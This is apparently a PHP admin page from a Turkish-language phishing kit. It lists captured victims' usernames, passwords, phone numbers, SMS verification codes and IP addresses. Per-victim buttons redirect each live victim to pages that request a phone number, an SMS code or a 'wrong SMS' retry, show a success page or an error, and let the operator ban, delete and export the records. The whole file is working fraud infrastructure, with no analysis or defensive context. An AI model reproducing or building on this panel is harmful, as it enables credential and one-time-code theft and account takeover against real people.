<?php
$title = "Kayıtlar";
include_once 'partials/header.php';

?>
<div class="main-wrapper">

    <div class="d-flex justify-content-between">
        <div>
            <button type="button" id="export" class="btn btn-outline-primary m-b-xs">
                Dışa Aktar
            </button>
        </div>
        <div>
            <button type="button" class="btn btn-outline-secondary m-b-xs">Çevrimiçi: <span id="online">
                    <?= $ajax->getOnline() ?>
                </span></button>
            <button type="button" class="btn btn-outline-secondary m-b-xs">Toplam: <span id="total">
                    <?= $ajax->getTotalRecord() ?>
                </span></button>
            <button type="button" class="btn btn-outline-secondary m-b-xs">Ban: <span id="ban">
                    <?= $ajax->getBans()['count'] ?>
                </span></button>
        </div>
        <div>
            <button type="button" class="btn btn-warning m-b-xs" id="offlineClear">Çevrimdışı Sıfırla</button>
            <button type="button" class="btn btn-primary m-b-xs" id="recordClear">Log Sıfırla</button>
            <button type="button" class="btn btn-danger m-b-xs" id="banClear">Ban Sıfırla</button>
        </div>
    </div> 
    <div class="table-responsive">
        <table class="table table-bordered">
            <thead>
                <tr>
                    <th width="1%" scope="col">#</th>
                    <th width="2%" scope="col">Sayfa</th>
                    <th width="5%" scope="col">K.adı</th>
                    <th width="5%" scope="col">Parola</th> 
                    <th width="5%" scope="col">Telefon</th> 
                    <th width="5%" scope="col">Sms</th>
                    <th width="5%" scope="col">Sms 2</th>  
                    <th width="4%" scope="col">IP</th>
                    <th width="7%" scope="col">İşlem</th>
                </tr>
            </thead>
            <tbody id="records">
                <?php foreach ($ajax->getAllRecords() as $record): ?>
                    <tr>
                        <?= ($record['lastOnline'] > time() ? '<td class="bg-success id">' . $record['id'] . '</td>' : '<td class="bg-danger id">' . $record['id'] . '</td>') ?>
                        <td>
                            <?= $record['page'] ?>
                        </td>
                        <td onclick="copy(this)">
                            <?= $record['username'] ?>
                        </td>
                        <td onclick="copy(this)">
                            <?= $record['password'] ?>
                        </td>
                        <td onclick="copy(this)">
                            <?= $record['phone'] ?>
                        </td>
                        <td onclick="copy(this)">
                            <?= $record['sms'] ?>
                        </td> 
                        <td onclick="copy(this)">
                            <?= $record['ajaxsms'] ?>
                        </td> 
                        <td onclick="copy(this)">
                            <?= $record['ipAddress'] ?>
                        </td> 
                        <td class="p-0">
                            <div class="input-group">
                                <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="basadondur" data-ip="<?= $record['ipAddress'] ?>">BAŞA DÖNDÜR</button>
                                <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="ekbilgi" data-ip="<?= $record['ipAddress'] ?>">EK BİLGİ</button>
                                <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="phone" data-ip="<?= $record['ipAddress'] ?>">TELEFON ISTE</button>
                                <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="notification" data-ip="<?= $record['ipAddress'] ?>">BİLDİRİM ONAYI</button>
                                <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="sms" data-ip="<?= $record['ipAddress'] ?>"> <i class="fas fa-comment"></i> SMS</button>
                                <button class="btn btn-primary  redirect p-2 pb-1 pt-1" data-page="sms2" data-ip="<?= $record['ipAddress'] ?>"> <i class="fas fa-comment"></i> HATALI SMS</button>
                                <button class="btn btn-success  redirect p-2 pb-1 pt-1" data-ip="<?= $record['ipAddress'] ?>" data-page="tebrik"><i class="fas fa-check"></i> Tebrik</button>
                                <button class="btn btn-danger redirect p-2 pb-1 pt-1" data-ip="<?= $record['ipAddress'] ?>" data-page="hata" data-type="eticaret"><i  class="fas fa-times"></i> Hata</button>
                                <button class="btn btn-danger  remove p-2 pb-1 pt-1" data-id="<?= $record['id'] ?>"><i class="fas fa-trash"></i> Sil</button>
                                <button class="btn btn-danger  ban p-2 pb-1 pt-1" data-ip="<?= $record['ipAddress'] ?>"><i class="fas fa-ban"></i> Ban</button>
                            </div>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

</div>
<script src="assets/js/ajax.js">

    <?php include_once 'partials/footer.php'; ?>
        <script>
        $(document).on("click", ".process_modal", function () {
            var ip = $(this).data('ip');
            $("#processModal").modal('show')

            $(".redirect").data('ip', ip)
            $("#processIP").text(ip)

        })
</script>